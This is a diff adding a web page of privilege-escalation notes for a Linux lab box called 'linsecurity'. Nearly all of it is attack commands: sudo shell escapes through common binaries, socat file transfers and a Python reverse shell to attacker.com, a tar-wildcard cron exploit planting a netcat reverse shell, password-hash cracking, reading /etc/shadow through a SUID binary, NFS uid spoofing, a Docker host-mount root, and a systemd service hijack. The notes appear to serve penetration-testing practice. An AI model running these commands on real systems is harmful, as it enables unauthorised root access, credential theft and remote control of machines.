@@ -1,0 +1,289 @@
+<h1 id="1-tip">1 tip</h1>
+<hr />
+<p>“…Turn on privileged mode… If the shell is started with the effective user (group) id not equal to the real user (group) id, and the -p option is not supplied, these actions are taken and the effective user id is set to the real user id. If the -p option is supplied at startup, the effective user id is not reset. Turning this option off causes the effective user and group ids to be set to the real user and group ids…”</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash -p
+</code></pre></div></div>
+<p> </p>
+<h1 id="2-gtfobins">2 gtfobins</h1>
+<hr />
+<h2 id="-check">| check</h2>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo -l
+User bob may run the following commands on linsecurity:
+    (ALL) /bin/ash, /usr/bin/awk, /bin/bash, /bin/sh, /bin/csh, /usr/bin/curl, /bin/dash, /bin/ed, /usr/bin/env, /usr/bin/expect, /usr/bin/find, /usr/bin/ftp, /usr/bin/less, /usr/bin/man, /bin/more, /usr/bin/scp, /usr/bin/socat,
+        /usr/bin/ssh, /usr/bin/vi, /usr/bin/zsh, /usr/bin/pico, /usr/bin/rvim, /usr/bin/perl, /usr/bin/tclsh, /usr/bin/git, /usr/bin/script, /usr/bin/scp
+</code></pre></div></div>
+
+<h2 id="-ash">| ash</h2>
+<p>can be use to scape a restricted shell if granted sudo is easy privesc</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo ash
+</code></pre></div></div>
+
+<h2 id="-awk">| awk</h2>
+<p>can be use to scape a restricted shell , if can run as sudo, insta privesc</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo awk 'BEGIN {system("/bin/bash")}'
+</code></pre></div></div>
+
+<h2 id="-csh">| csh</h2>
+<p>like ash</p>
+
+<h2 id="-curl">| curl</h2>
+<h4 id="--file-read">#  file read</h4>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>LFILE=/tmp/file_to_read
+curl file://$LFILE
+</code></pre></div></div>
+
+<h2 id="-ed">| ed</h2>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo ed
+!/bin/bash
+</code></pre></div></div>
+
+<h2 id="-env">| env</h2>
+
+<h4 id="--shell">#  shell</h4>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>env /bin/sh
+</code></pre></div></div>
+<h4 id="--sudo">#  sudo</h4>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo env /bin/sh
+</code></pre></div></div>
+
+<h2 id="expect">expect</h2>
+<h4 id="-shell"># shell</h4>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo expect -c 'spawn /bin/sh;interact'
+</code></pre></div></div>
+<h2 id="find">find</h2>
+<h4 id="-shell-1"># shell</h4>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo find . -exec /bin/sh \; -quit
+</code></pre></div></div>
+<h4 id="-suid"># suid</h4>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo sh -c 'cp $(which find) .; chmod +s ./find'
+
+./find . -exec /bin/sh -p \; -quit
+</code></pre></div></div>
+
+<h2 id="ftp">ftp</h2>
+<h4 id="-shell-2"># shell</h4>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo ftp
+!/bin/sh
+</code></pre></div></div>
+<h2 id="less">less</h2>
+<h4 id="-shell-3"># shell</h4>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo less /etc/profile
+!/bin/sh
+</code></pre></div></div>
+
+<h4 id="-file-read"># file read</h4>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>less /etc/profile
+:e file_to_read
+</code></pre></div></div>
+<h2 id="man">man</h2>
+<h4 id="-shell-4"># shell</h4>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo man man
+!/bin/sh
+</code></pre></div></div>
+
+<h2 id="more">more</h2>
+<h4 id="-shell-5"># shell</h4>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>TERM= sudo more /etc/profile
+!/bin/sh
+</code></pre></div></div>
+
+<h2 id="scp">scp</h2>
+<h4 id="-shell-6"># shell</h4>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>TF=$(mktemp)
+echo 'sh 0&lt;&amp;2 1&gt;&amp;2' &gt; $TF
+chmod +x "$TF"
+sudo scp -S $TF x y:
+</code></pre></div></div>
+
+<h2 id="socat">socat</h2>
+<h4 id="-shell-7"># shell</h4>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo socat stdin exec:/bin/sh
+</code></pre></div></div>
+
+<h4 id="-file-upload"># file upload</h4>
+<p>on attacker run</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code> socat -u file:file_to_send tcp-listen:12345,reuseaddr
+</code></pre></div></div>
+<p>on box:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>RHOST=attacker.com
+RPORT=12345
+LFILE=file_to_save
+socat -u tcp-connect:$RHOST:$RPORT open:$LFILE,creat
+</code></pre></div></div>
+
+<h4 id="-file-download"># file download</h4>
+<p>on attacker run</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>socat -u file:file_to_send tcp-listen:12345,reuseaddr
+</code></pre></div></div>
+<p>on box</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>RHOST=attacker.com
+RPORT=12345
+LFILE=file_to_save
+socat -u tcp-connect:$RHOST:$RPORT open:$LFILE,creat
+</code></pre></div></div>
+
+<h2 id="ssh">ssh</h2>
+<h4 id="-shell-8"># shell</h4>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh localhost $SHELL --noprofile --norc
+sudo ssh -o ProxyCommand=';sh 0&lt;&amp;2 1&gt;&amp;2' x
+</code></pre></div></div>
+
+<h2 id="vi">vi</h2>
+<h4 id="-shell-9"># shell</h4>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo vi -c ':!/bin/sh' /dev/nul
+</code></pre></div></div>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vi
+:set shell=/bin/sh
+:shell
+</code></pre></div></div>
+
+<h2 id="pico">pico</h2>
+<h4 id="-shell-10"># shell</h4>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo pico
+^R^X
+reset; sh 1&gt;&amp;0 2&gt;&amp;0
+</code></pre></div></div>
+<h2 id="rvim">rvim</h2>
+<h4 id="-shell-11"># shell</h4>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo rvim -c ':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
+sudo rvim -c ':lua os.execute("reset; exec sh")'
+</code></pre></div></div>
+<h4 id="-reverse-shell"># reverse shell</h4>
+<p>on kali</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>socat file:`tty`,raw,echo=0 tcp-listen:12345
+</code></pre></div></div>
+<p>on box</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>export RHOST=attacker.com
+export RPORT=12345
+rvim -c ':py import vim,sys,socket,os,pty;s=socket.socket()
+s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))
+[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
+pty.spawn("/bin/sh")
+vim.command(":q!")'
+</code></pre></div></div>
+
+<h2 id="perl">perl</h2>
+<h4 id="-shell-12"># shell</h4>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo perl -e 'exec "/bin/sh";'
+</code></pre></div></div>
+
+<h2 id="tclsh">tclsh</h2>
+<h4 id="-shell-13"># shell</h4>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo tclsh
+exec /bin/sh &lt;@stdin &gt;@stdout 2&gt;@stderr
+</code></pre></div></div>
+
+<h2 id="git">git</h2>
+<h4 id="-shell-14"># shell</h4>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PAGER='sh -c "exec sh 0&lt;&amp;1"' git -p help
+sudo PAGER='sh -c "exec sh 0&lt;&amp;1"' git -p help
+</code></pre></div></div>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo git help config
+!/bin/sh
+</code></pre></div></div>
+
+<h2 id="script">script</h2>
+<h4 id="-shell-15"># shell</h4>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>script -q /dev/null
+sudo script -q /dev/null
+</code></pre></div></div>
+
+<h2 id="strace">strace</h2>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo strace -o /dev/null /bin/bash
+</code></pre></div></div>
+<p> </p>
+<h1 id="2-hash--in-etcpasswd">2 HASH  in /etc/passwd</h1>
+<hr />
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat /etc/passwd
+insecurity:AzER3pBZh6WZE:0:0::/:/bin/sh
+</code></pre></div></div>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>echo AzER3pBZh6WZE &gt; linisecurity
+hashcat -m 1500 -a 0 linsecurity rockyou.txt --force
+</code></pre></div></div>
+
+<p> </p>
+<h1 id="3-cron--tar-wildcard">3 CRON , TAR, wildcard</h1>
+<hr />
+<h4 id="-1"># 1</h4>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat /etc/crontab
+*/1 #### \#   #### \# #### \# #### \#   root    /etc/cron.daily/backup
+</code></pre></div></div>
+<h4 id="-2"># 2</h4>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat /etc/cron.daily/backup
+for i in $(ls /home); do cd /home/$i &amp;&amp; /bin/tar -zcf /etc/backups/home-$i.tgz *; done
+</code></pre></div></div>
+<h4 id="-3-start-listener"># 3 start listener</h4>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc -nlvp 443
+</code></pre></div></div>
+<h4 id="-4-exploit-tar-wildcard-use-by-cronjob"># 4 exploit tar wildcard use by cronjob</h4>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>echo "mkfifo /tmp/mini; nc 192.168.100.220 443 0&lt;/tmp/mini | /bin/sh &gt;/tmp/mini 2&gt;&amp;1; rm /tmp/mini" &gt; /home/bob/shell.sh &amp;&amp; chmod +x /home/bob/shell.sh
+echo "" &gt; "--checkpoint-action=exec=sh shell.sh"
+echo "" &gt; --checkpoint=1
+</code></pre></div></div>
+<p> </p>
+<h1 id="4-find-hidden-files">4 find hidden files</h1>
+<hr />
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / -name ".*" -type f -path "/home/*" 2&gt;/dev/null
+/home/susan/.secret
+</code></pre></div></div>
+<p> </p>
+<h1 id="5-suid--1">5 SUID  1</h1>
+<hr />
+<h4 id="-find-suid-files"># find suid files</h4>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / -perm -4000 -type f -exec ls -lah {} 2&gt;/dev/null \;
+</code></pre></div></div>
+<h4 id="-xxd"># xxd</h4>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>xxd "/etc/shadow" | xxd -r
+</code></pre></div></div>
+<p> </p>
+<h1 id="6-suid-2">6 SUID 2</h1>
+<hr />
+<h4 id="-find-suid-files-1"># find suid files</h4>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / -perm -4000 -type f -exec ls -lah {} 2&gt;/dev/null \;
+</code></pre></div></div>
+<h4 id="-taskset"># taskset</h4>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>taskset 1 /bin/bash -p
+</code></pre></div></div>
+<p> </p>
+<h1 id="7-nfs">7 NFS</h1>
+<hr />
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>showmount -e 192.168.100.111
+mount 192.168.100.111:/home/peter /mnt/peter
+</code></pre></div></div>
+<p>we cant write to /mnt/peter (no_root_squash)
+BUT, we can create an user with the same  uid/gid que en el export, y asi escribir al volumen montado y subir unas ssh keys</p>
+
+<h2 id="check-uid-y-gid">check uid y gid</h2>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ls -lan
+</code></pre></div></div>
+
+<h2 id="create-user-in-kali">create user in kali</h2>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:/tmp/peter# groupadd -g 1005 peter
+root@kali:/tmp/peter# adduser peter -uid 1001 -gid 1005
+root@kali:/tmp/peter# su peter
+</code></pre></div></div>
+<p>now we have write access to the nfs volume<br />
+ </p>
+<h1 id="8-docker">8 DOCKER</h1>
+<hr />
+<p>rootplease</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker run -v /:/hostOS -i -t chrisfosterelli/rootplease
+</code></pre></div></div>
+<p> </p>
+<h1 id="9-ver-gtfobins">9 ver gtfobins</h1>
+<hr />
+<p>https://gtfobins.github.io/
+ </p>
+<h1 id="10-systemd">10 systemd</h1>
+<hr />
+<h2 id="check">check</h2>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ls -la /lib/systemd/system/
+debug.system is owned by peter
+</code></pre></div></div>
+<h2 id="change">change</h2>
+<p>then we can change /lib/systemd/system/debug.system ExecStart= to a script that we want to run as root (ej reverseshell)</p>
+<h2 id="restart-service">restart service</h2>
+<p>probably we need to reboot the box</p>
